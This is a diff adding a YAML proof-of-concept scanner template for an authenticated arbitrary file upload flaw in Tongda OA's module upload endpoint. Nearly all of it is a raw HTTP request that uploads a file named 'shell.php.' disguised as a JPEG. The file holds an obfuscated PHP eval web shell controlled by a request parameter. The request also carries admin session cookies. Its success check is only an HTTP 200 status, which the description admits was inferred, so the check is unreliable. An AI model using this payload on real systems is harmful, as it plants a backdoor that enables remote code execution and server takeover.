@@ -1,0 +1,93 @@
+id: poc-55cb78403100bc09f843
+info:
+  name: 通达OAmodule存在后台任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/55cb78403100bc09f8433fbe2deb4b52
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 55cb78403100bc09f8433fbe2deb4b52
+    fofa: + hunter`app.name="通达 OA"`
+http:
+- raw:
+  - 'POST /module/upload/upload.php?encode=utf-8 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    X_Requested_With: XMLHttpRequest
+
+    Content-Type: multipart/form-data; boundary=---------------------------296004247523879430461279754861
+
+    Content-Length: 1273
+
+    Origin: http://xx.xx.xx.xx:81
+
+    Connection: close
+
+    Referer: http://1.14.47.145:81/module/ueditor/dialogs/image/image.html
+
+    Cookie: USER_NAME_COOKIE=admin; SID_1=f46a75ea; OA_USER_ID=admin; PHPSESSID=r0jrqh0gmtvabe4qpmmvm7lar4
+
+
+    -----------------------------296004247523879430461279754861
+
+    Content-Disposition: form-data; name="id"
+
+
+    WU_FILE_0
+
+    -----------------------------296004247523879430461279754861
+
+    Content-Disposition: form-data; name="name"
+
+
+    shell.jpg
+
+    -----------------------------296004247523879430461279754861
+
+    Content-Disposition: form-data; name="type"
+
+
+    image/jpeg
+
+    -----------------------------296004247523879430461279754861
+
+    Content-Disposition: form-data; name="lastModifiedDate"
+
+
+    2023/5/9 11:29:05
+
+    -----------------------------296004247523879430461279754861
+
+    Content-Disposition: form-data; name="size"
+
+
+    444
+
+    -----------------------------296004247523879430461279754861
+
+    Content-Disposition: form-data; name="file"; filename="shell.php."
+
+    Content-Type: image/jpeg
+
+
+    <?php class Gz5SfY10 { public function __construct($H7Es8){ @eval("/*Z7y11Eib8N*/".$H7Es8.""); }}new Gz5SfY10($_REQUEST[''x'']);?>
+
+
+    -----------------------------296004247523879430461279754861--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
